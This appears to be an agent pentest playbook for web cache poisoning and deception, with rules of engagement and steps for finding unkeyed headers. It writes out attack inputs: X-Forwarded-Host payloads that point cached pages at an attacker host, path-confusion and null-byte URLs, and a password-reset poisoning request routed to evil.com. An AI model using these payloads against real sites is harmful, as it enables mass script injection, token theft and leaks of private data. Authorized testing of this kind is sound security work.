# Web Cache Poisoning and Deception

## Scope and preconditions

Applies to any application behind a caching layer: CDN (Cloudflare, Akamai,
Fastly), reverse proxy (Varnish, Nginx), or application-level cache. Covers
both cache poisoning (inject malicious content into cached responses) and cache
deception (trick the cache into storing sensitive responses).

It does **not** cover: DNS cache poisoning, browser cache exploitation, or
general header injection without caching impact.

## Rules of engagement

- MUST use cache-buster parameters to isolate your tests from other users.
  Always append `?cb=RANDOM` to avoid poisoning pages for real users.
- MUST verify poisoning from a different IP/session before claiming success.
- NEVER poison authentication or payment pages without explicit authorization.
- MUST document the TTL and blast radius of any successful poisoning.

## Workflow

- [ ] 1. Identify caching infrastructure
- [ ] 2. Find unkeyed inputs
- [ ] 3. Test cache poisoning
- [ ] 4. Test cache deception
- [ ] 5. Test fat GET attacks
- [ ] 6. Test password reset poisoning
- [ ] 7. Assess impact and record

## Step 1: Identify caching infrastructure

### Goal
Determine if responses are cached and by what.

### Actions
Use `search_responses` and `send_request` to find cache indicators:

| Header | Meaning |
|---|---|
| `X-Cache: HIT` / `MISS` | CDN/proxy cache status |
| `Age: 300` | Response has been cached for 300 seconds |
| `Via: 1.1 varnish` | Varnish proxy in the path |
| `CF-Cache-Status: HIT` | Cloudflare cache |
| `X-Served-By: cache-...` | Fastly cache |
| `Cache-Control: max-age=3600` | Response cacheable for 1 hour |
| `Vary: Accept-Encoding` | Cache varies by this header (important!) |

Send the same request twice. If the second is faster and `Age` increases or
`X-Cache` changes to `HIT`, the response is cached.

## Step 2: Find unkeyed inputs

### Goal
Identify headers and parameters that affect the response but are NOT part of
the cache key.

### Technique
The cache key typically includes: method, host, path, query string. Headers
are usually NOT in the cache key. If a header changes the response but is not
in the key, you can poison the cache.

Test these unkeyed headers with `send_request`:

| Header | Effect to test |
|---|---|
| `X-Forwarded-Host` | Reflected in links, redirects, scripts |
| `X-Forwarded-Scheme` | Changes HTTP/HTTPS in generated URLs |
| `X-Forwarded-Proto` | Same as above |
| `X-Original-URL` | Overrides the request path (IIS/Symfony) |
| `X-Rewrite-URL` | Overrides path (IIS) |
| `X-Forwarded-Port` | Changes port in generated URLs |
| `X-Forwarded-Prefix` | Prepends prefix to generated URLs |
| `X-Host` | Alternative Host header |
| `Forwarded: host=evil.com` | RFC 7239 forwarded header |
| `X-Forwarded-For` | May change response content (geo-based) |

For each: send the header, check if it changes the response, then send without
the header and check if the cached (poisoned) response is served.

## Step 3: Test cache poisoning

### Goal
Inject malicious content that is served to other users from cache.

### Actions
1. Find an unkeyed input that is reflected in the response (Step 2).
2. Inject a payload via that input:
   ```
   X-Forwarded-Host: evil.com
   ```
   If the page generates `<script src="https://evil.com/js/app.js">`, the
   cached page loads JavaScript from the attacker.

3. Use a cache-buster to test safely:
   ```
   GET /page?cb=test123
   X-Forwarded-Host: evil.com
   ```

4. Verify from a different session (no custom headers):
   ```
   GET /page?cb=test123
   ```
   If the poisoned response is returned — cache poisoning confirmed.

### Import-based poisoning
```
X-Forwarded-Host: evil.com
```
If the page has `<link rel="stylesheet" href="https://evil.com/style.css">`,
injected CSS executes on every page load for the TTL duration.

### Meta redirect poisoning
```
X-Forwarded-Host: evil.com
```
If the page generates `<meta http-equiv="refresh" content="0;url=https://evil.com/">`,
all users visiting the cached page are redirected.

## Step 4: Test cache deception

### Goal
Trick the cache into storing authenticated responses as public.

### Technique (distinct from poisoning)
In cache deception, the attacker makes the **victim** visit a URL that:
1. The application serves with the victim's private data (account page)
2. The cache stores as a static resource

**Path confusion**:
```
https://target.com/account/settings/nonexistent.css
```
- The application ignores the `.css` extension, serves the account page
- The cache sees `.css`, treats it as a static resource, stores it
- The attacker fetches the cached URL, reads the victim's data

**Path normalization variants**:
```
/account%2fsettings          → app normalizes, cache doesn't
/account/..%2fsettings       → path traversal + normalization diff
/account/settings/           → trailing slash handling differs
/account/settings;.css       → Tomcat path parameter
/account/settings%00.css     → null byte
```

### Detection
Send a request for an authenticated page with a static-looking extension.
If it returns private data AND is cached (check `X-Cache`, `Age`), cache
deception works.

## Step 5: Fat GET attacks

### Goal
Exploit caches that ignore GET request bodies.

### Technique
Some applications process GET request bodies (against HTTP semantics):
```
GET /api/user HTTP/1.1
Content-Type: application/json

{"admin": true}
```
The cache ignores the body (it's a GET — no body expected), stores the response.
The response reflects the body's influence. Other users get the cached response
without sending the body.

Test with `send_request`: send a GET with a body that changes the response.

## Step 6: Password reset poisoning

### Goal
Poison cached password reset pages to steal tokens.

### Technique
```
POST /forgot-password HTTP/1.1
Host: target.com
X-Forwarded-Host: evil.com

email=victim@target.com
```

If the application generates reset links using `X-Forwarded-Host` AND the
response is cached:
1. The cached reset page sends all users' reset links to `evil.com`
2. Any user requesting a password reset gets a link to the attacker's domain

This is different from direct Host header ATO — here the cache amplifies the
attack to ALL users, not just one victim.

## Step 7: Assess impact and record

### Impact ladder

| Scenario | Severity |
|---|---|
| Unkeyed header reflected but not cached | Informational |
| Cache poisoning with HTML injection | Medium |
| Cache poisoning with JavaScript injection | High-Critical |
| Cache deception leaking user data | High |
| Password reset link poisoning via cache | Critical |
| Cache poisoning on login/auth pages | Critical |

### Blast radius factors
- **TTL**: How long does the poisoned response persist?
- **Scope**: Does it affect one page or the entire site?
- **CDN distribution**: Is the poison replicated to all CDN edge nodes?
- **Cache key scope**: Does the poison affect all users or only a subset?

Use `add_pentest_finding` with:
- The unkeyed input used for poisoning
- The poisoned response (showing injected content)
- Verification from a clean session
- TTL and blast radius assessment

## Known false positives

- Header reflected in response but response not cached — no poisoning impact.
  Check `X-Cache`, `Age`, `Cache-Control`.
- Response cached but the injected content is harmless (reflected in a comment,
  in a JSON field not rendered in HTML).
- Cache deception where the response has `Cache-Control: no-store` — the CDN
  should not cache it. Verify that it actually doesn't.
- `X-Forwarded-Host` reflected in the response but the application already uses
  its own domain in generated URLs — the reflection does not override.

## Reminder

Cache poisoning and deception are different attacks. **Poisoning**: attacker
injects content into the cache, all users receive it. **Deception**: attacker
tricks the cache into storing the victim's private response, attacker reads it.
The highest-value test: find an unkeyed header that is reflected in a `<script>`
src or `<link>` href — that is stored XSS via cache, affecting every visitor
for the cache TTL duration.
